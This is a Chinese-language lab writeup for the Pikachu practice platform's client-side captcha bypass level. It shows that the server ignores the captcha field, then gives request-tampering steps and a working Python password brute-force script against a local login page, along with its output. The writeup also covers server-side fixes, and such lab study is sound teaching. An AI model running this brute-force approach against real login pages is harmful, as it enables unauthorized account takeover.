---
layout: post
title: Pikachu - 暴力破解 验证码绕过(on client) Writeup
platform: pikachu
date: 2026-10-25 19:40:00 +0800
categories: CTF
---

Pikachu - 暴力破解 验证码绕过(on client) Writeup

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：暴力破解 → 验证码绕过（on client）
- 地址：`http://localhost/pikachu/vul/burteforce/bf_client.php`
- 题型：Web
- 考点：**前端校验 = 没有校验**

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4
pikachu 源码放在 D:\phpstudy_pro\WWW\pikachu\
```

**✅ 实测结果**

```text
★ 页面上的"验证码"长这样：

    [ Username          ]
    [ Password          ]
    [ 验证码            ]
    [ 9ZHHX             ]   ← ★ 不是图片，是一个只读输入框！
       └─┬─┘
    验证码明文显示在这

★ 服务器到底认不认验证码？三组实测：

    ① 完全不传 vcode，密码正确   → ✅ login success
    ② vcode=WRONGG，密码正确     → ✅ login success
    ③ vcode 为空，密码正确       → ✅ login success

    ★ 传错、传空、不传 —— 服务器全都不管

★ 脚本爆破（全程不传 vcode）：

    目标用户 pikachu
    [  1/145]  123456     失败
    ...
    [ 31/145]  000000     ★★★ 成功
    尝试 31 次，耗时 1.0 秒
```

二、题目分析

**① 页面上的验证码长什么样（这是关键）**

**正常网站**：

```html
<input name="vcode" placeholder="验证码" />
<img src="captcha.php" />        ← 图片，人眼识别
```

**这关**：

```html
<input class="vcode" name="vcode" placeholder="验证码" type="text" />

<!-- ★ 下面这个不是图片，是另一个输入框 -->
<label>
    <input type="text" onclick="createCode()" readonly="readonly"
           id="checkCode" class="unchanged" style="width: 100px" />
</label>
```

**★ 验证码是一个"只读的文本输入框"，值直接显示在页面上。**

**截图效果**：

```text
┌────────────────────────┐
│ 验证码                 │  ← 用户输入框
├────────────────────────┤
│ 9ZHHX                  │  ← "验证码图片"（其实是 readonly 输入框）
└────────────────────────┘
```

**★ 你看到什么，机器就看到什么 —— 完全不用识别。**

**② 验证码是谁生成的（JavaScript）**

```javascript
// bf_client.php 第 134 行左右
function createCode() {
    // 随机字符集
    var codeChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    var code = "";

    // 生成 5 位
    for (var i = 0; i < 5; i++) {
        var charIndex = Math.floor(Math.random() * codeChars.length);
        code += codeChars.charAt(charIndex);
    }

    var checkCode = document.getElementById("checkCode");
    if (checkCode) {
        checkCode.value = code;        // ★ 直接写进输入框，显示出来
    }
}
```

**★ 验证码是浏览器 JS 随机生成的，没有任何服务器参与。**

**③ 验正码是谁校验的（还是 JavaScript）**

```javascript
// bf_client.php 第 151 行左右
function validate() {
    var inputCode = document.querySelector('#bf_client .vcode').value;   // 用户输入
    var checkCodeValue = document.getElementById("checkCode").value;     // 真实验证码

    if (inputCode == "") {
        alert("请输入验证码！");
        return false;                    // ★ 阻止表单提交
    }

    if (inputCode != checkCodeValue) {
        alert("验证码输入错误！");        // ★ 浏览器弹窗
        return false;                    // ★ 阻止表单提交
    }
}
```

**★ 校验完全在浏览器里：用 `alert` 报错，用 `return false` 阻止提交。**

**④ 服务器端代码（关键：完全没有验证码检查）**

```php
<?php
if(isset($_POST['submit'])){
    if($_POST['username'] && $_POST['password']) {

        $username = $_POST['username'];
        $password = $_POST['password'];

        $sql = "select * from users where username=? and password=md5(?)";
        $line_pre = $link->prepare($sql);
        $line_pre->bind_param('ss', $username, $password);

        if ($line_pre->execute()) {
            $line_pre->store_result();
            if ($line_pre->num_rows > 0) {
                $html .= '<p> login success</p>';
            } else {
                $html .= '<p> username or password is not exists～</p>';
            }
        }
    } else {
        $html .= '<p> please input username and password～</p>';
    }
}
?>
```

**★ 全文搜 `vcode` → 0 个结果。**

**★ 服务器只认 `username` 和 `password`，验证码参数根本不存在于它的世界里。**

**⑤ 所以漏洞的本质是什么**

```text
页面呈现给用户：  用户名 + 密码 + 验证码 + 登录按钮
服务器实际处理：  用户名 + 密码
                  ↑
            验证码？不存在的
```

**★ 那个验证码是纯装饰品**：

```
它唯一的作用是"在浏览器里拦一下普通用户"
对于攻击者，只要不发浏览器的请求，它就不存在
```

**⑥ 为什么叫 "on client"**

| | on client（本关）| on server（上一关）|
|---|---|---|
| 验证码在哪生成 | **浏览器 JS** | 服务器 PHP |
| 验证码存在哪 | **HTML 的 input 里** | 服务器的 `$_SESSION` |
| 谁做校验 | **浏览器 JS** | 服务器 PHP |
| 服务器认得验证码吗 | **完全不认** | 认得 |
| 绕过方式 | **直接发请求**（不用管验证码）| 复用验证码（要抓一次票）|

**★ "on client" = 验证码从头到尾没离开过你的浏览器。**

三、解题步骤

**第 1 步：先看清楚页面上的"验证码"是什么**

```text
① 打开 http://localhost/pikachu/vul/burteforce/bf_client.php
② 看到验证码是 "9ZHHX" 这种文本，显示在一个框里

③ 右键那个框 → 【检查】(Inspect)
   → 看到它的 HTML：

    <input type="text" onclick="createCode()" readonly="readonly"
           id="checkCode" class="unchanged" style="width: 100px" />

④ 注意两个属性：
    readonly="readonly"   ← 只读（用户改不了，但能看）
    id="checkCode"        ← 就是这个元素被 JS 写入值
    
★ 结论：它根本不是图片，是个 input
```

**第 2 步：手工验证"浏览器在拦你"**

```text
① 填：Username = admin
      Password = 123456
      验证码   = 111111（故意填错）
② 点 Login

→ 浏览器弹窗："验证码输入错误！"
→ 页面没有跳转，也没有请求发出

★ 这一步说明：现在是【浏览器】在拦你，不是服务器
```

**怎么确认"请求没发出"**：

```text
F12 → 【网络】→ 点 Login
→ 网络面板里【没有】新的 bf_client.php 请求

★ 因为 JS 的 return false 阻止了表单提交
```

**第 3 步：绕过浏览器（禁用 JavaScript）**

```text
① F12 → 右上角齿轮（设置）→ 调试器 → 勾选【禁用 JavaScript】
② 刷新页面（此时验证码框里是空的，因为 JS 没运行）
③ 填：admin / 123456 / 111111（随便填，甚至不填也行）
④ 点 Login按钮

→ ★ 没有弹窗了
→ 请求正常发出
→ 页面显示 "login success"
```

**★ 这就是第一个绕过方式："禁用 JS"。**

**原理**：

```text
表单的提交按钮是 <input type="submit">
默认行为就是"提交表单"
JS 的 validate() 靠 onsubmit 里的 return false 来阻止

禁用 JS → onsubmit 不执行 → 表单照常提交
```

**第 4 步：绕过方式二 —— 直接发请求（不用管浏览器）**

**用 F12 的"编辑并重发"（最快）**：

```text
① 先正常提交一次（比如 admin / 123456 / 正确的验证码）
② F12 → 网络 → 找到 bf_client.php 的 POST 请求
③ 右键 → 【编辑并重发】(Edit and Resend)
④ 把 body 改掉：
     原来： username=admin&password=123456&vcode=9ZHHX&submit=Login
     改成： username=pikachu&password=000000&submit=Login
                                    ↑ 直接删掉 vcode
⑤ 点【发送】
⑥ 看响应 → "login success"
```

**★ 这一步证明：服务器完全不看 vcode。**

**第 5 步：脚本爆破**

```python
import time
import urllib.parse
import urllib.request

URL = "http://localhost/pikachu/vul/burteforce/bf_client.php"
DICT = r"C:\Users\cecilia\Downloads\passwords-top150.txt"


def try_login(username, password):
    # ★ 关键：请求里【完全不传 vcode】
    data = urllib.parse.urlencode({
        "username": username,
        "password": password,
        "submit": "Login",
    }).encode()

    req = urllib.request.Request(URL, data=data, method="POST", headers={
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded",
    })
    with urllib.request.urlopen(req, timeout=15) as r:
        body = r.read().decode("utf-8", "replace")

    # ★ 注意：页面的 JS 里有 alert("验证码输入错误！") 字符串
    #    所以不能用 "验证码" 或 "错误" 当判断依据，会误判！
    if "login success" in body:
        return True
    return False


with open(DICT, encoding="utf-8") as f:
    passwords = [line.strip() for line in f if line.strip()]

start = time.time()
for i, pw in enumerate(passwords, 1):
    if try_login("pikachu", pw):
        print("[%d/%d] %s ★★★ 成功  耗时 %.1f 秒" % (i, len(passwords), pw, time.time() - start))
        break
    print("[%d/%d] %s 失败" % (i, len(passwords), pw))
```

**实测输出**：

```text
==================================================================
 pikachu 第 2 关：验证码绕过（on client）
 目标用户: pikachu
 关键：请求里【不传 vcode】，服务器照样处理
==================================================================

[  1/145]  123456                 失败
[  2/145]  password               失败
...
[ 31/145]  000000                 ★★★ 成功

==================================================================
✅ 爆破成功
   用户名: pikachu
   密  码: 000000
   尝试: 31 / 145 次   耗时: 1.0 秒
==================================================================

★ 全程没有传过一个 vcode 参数
★ 因为服务器压根不看它
```

**★ 整个脚本最关键的一行**：

```python
"submit": "Login",
# ★ 这里故意不写 "vcode"
```

**第 6 步：三种绕过方式对比**

| 方式 | 操作 | 难度 | 说明 |
|---|---|---|---|
| **禁用 JS** | F12 → 设置 → 禁用 JS → 提交 | ⭐ | 适合手工验证 |
| **直接发请求** | 删掉 vcode 参数重发 | ⭐ | 最干净 |
| **抄验证码** | 把 `9ZHHX` 抄进输入框 | ⭐ | 能过，但没意义（服务器不看）|

**★ 前两种本质一样：绕过浏览器那一层。**

四、延伸知识

**① 前端校验 vs 后端校验（核心概念）**

```text
前端校验（本关）：
    在【浏览器】里跑 JS 检查
    数据还没发出去就被拦
    ★ 攻击者可以禁用 JS / 直接发请求 → 完全绕过

后端校验（上一关）：
    数据发到服务器，服务器检查
    ★ 攻击者改不了服务器的逻辑 → 只能找逻辑漏洞
```

**★ 一句话**：

```text
客户端 = 用户的电脑 = 用户有完全控制权
→ 任何"只在客户端"的检查都不算安全措施
→ 所有校验必须在服务端再做一遍
```

**② 怎么 5 秒钟判断"这是不是前端校验"**

**通用方法（适用于任何网站）**：

```text
① F12 → 设置 → 禁用 JavaScript
② 刷新页面，再操作一次
③ 看结果：

    · 还能提交成功 → 前端校验 → 等于没有
    · 提交报错/无响应 → 后端校验 → 真的
```

**其他辅助判断**：

```text
· 看页面源码里有没有 validate() / check() 之类的函数
· 看请求参数里有没有"验证码"字段（没有 → 服务器可能不检查）
· 看响应里有没有"验证码错误"的文案（有 → 服务器检查了）
· 抓包后删掉某个参数，看服务器是否还报错
```

**★ 第 4 个方法最直接：删参数看反应。**

**③ 真实世界里"前端装饰品"的常见形式**

| 前端校验 | 真实作用 | 攻击者怎么看 |
|---|---|---|
| 验证码（本关）| 防普通用户乱试 | 禁用 JS / 直接发请求 |
| 密码强度检查 | 提示用户 | 直接发弱密码 |
| 金额/数量上限 | 提示用户 | 改请求参数 |
| 只能选固定选项的下拉框 | 限制输入 | 改请求参数为任意值 |
| 文件类型限制（accept）| 提示用户 | 传任意文件 |
| 隐藏字段（`<input type="hidden">`）| 传一些数据 | 随便改 |
| 按钮 disabled | 不让点 | 删掉 disabled 属性 |

**★ 共同点**：

```text
"页面限制" ≠ "服务器限制"
任何只存在于 HTML/JS 里的限制，都等于没有
```

**④ 三关对比：暴力破解的三种"防护"**

| 关卡 | 防护措施 | 服务器检查吗 | 漏洞 | 绕过 | 难度 |
|---|---|---|---|---|---|
| **第 1 关** `bf_form.php` | 无 | — | 无任何限制 | 直接跑字典 | ⭐ |
| **第 2 关** `bf_client.php` | 前端 JS 验证码 | ❌ **完全不检查** | 前端校验 | 直接发请求 | ⭐ |
| **第 3 关** `bf_server.php` | 后端验证码 | ✅ 检查 | 不销毁 + 泄露 | 复用验证码 | ⭐⭐ |

**★ 三关教的是同一个道理**：

```text
"没有防护" 和 "前端防护" 和 "做了一半的后端防护"
    → 攻击成本几乎一样（都是 1 秒内）

只有"完整的后端防护"（一次性验证码 + 限流 + 锁定）
    → 才真正把攻击成本抬上去
```

**⑤ 正确的做法**

```php
<?php
// ✅ 后端必须自己校验，不能信前端
if (empty($_POST['vcode'])) {
    die("请输入验证码");
}

if (strtolower($_POST['vcode']) != strtolower($_SESSION['vcode'])) {
    unset($_SESSION['vcode']);           // ★ 失败也销毁
    die("验证码错误");
}
unset($_SESSION['vcode']);               // ★ 成功也销毁

// 然后再验证用户名密码
...
```

**前端校验保留没关系，但只能是"用户体验优化"**：

```text
前端校验的作用：少发一次请求、即时提示
前端校验不能是：唯一的安全防线
★ 后端必须独立地、完整地再校验一遍
```

**⑥ 一个容易踩的坑：判断特征要精确**

**本关调试时的教训**：

```python
# ❌ 错误：用 "验证码" 判断是否被拦
elif "验证码" in body:
    print("验证码错误")
```

**为什么错**：

```text
页面的 JS 里就有这段字符串：

    alert("验证码输入错误！");

所以任何响应（成功或失败）都包含 "验证码" 和 "错误"
→ 判断永远命中
```

**正确的判断**：

```python
✅ 用 "login success"（只在成功时出现）
✅ 或 "not exists"（只在密码错时出现）
❌ 不要用 "验证码"（页面上到处都是）
```

**★ 通用原则**：

```text
判断特征必须满足：只在"特定情况"出现，不会误命中

做法：
    ① 先看成功响应的独有文案
    ② 再看失败响应的独有文案
    ③ 选一个"只在一边出现"的
```

五、总结

- **本题核心：验证码只存在于 HTML + JavaScript 里，服务器代码完全没有它。**

- **三组实测证据**：

```text
① 不传 vcode，密码正确  → ✅ login success
② vcode=WRONGG，密码正确 → ✅ login success
③ vcode 为空，密码正确   → ✅ login success
```

- **三种绕过方式**：

```text
① 禁用 JS         → 表单照常提交
② 直接发请求       → 删掉 vcode 参数（★ 最干净）
③ 抄验证码         → 能过，但没意义
```

- **三个必记要点**：

```text
① 前端校验 = 装饰品，任何时候都能绕过
② 5 秒判断法：禁用 JS 再提交一次，能过就是假的
③ 所有安全校验必须在服务端独立再做一遍
```

- **实测结果**：

```text
pikachu / 000000  （第 31 次命中，1.0 秒，全程不传 vcode）
```

- Pikachu 暴力破解模块进度：

```text
✅ 基于表单的暴力破解      —— 无任何防护
✅ 验证码绕过（on client） —— 本题：前端校验 = 没有
✅ 验证码绕过（on server） —— 不销毁 + 泄露
⬜ token 防爆破           —— 每次请求要带 token
```

**手工复现要点**：

```text
· 看页面：验证码是个 readonly 输入框，明文显示
· 右键检查：确认是 <input>，不是 <img>
· 禁用 JS → 填错验证码也能登录成功
· F12 网络 → 编辑并重发 → 删掉 vcode → 依然成功
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────┐
│  前端校验 = "门口的告示牌"                              │
│      写着"禁止入内"，但门根本没锁                        │
│                                                        │
│  后端校验 = "门口的锁"                                  │
│      真上锁了，你得想办法撬                               │
│                                                        │
│  ★ 判断方法：禁用 JS 再试一次                            │
│  ★ 凡是只写在 HTML/JS 里的限制，都等于没有                │
└────────────────────────────────────────────────────────┘
```
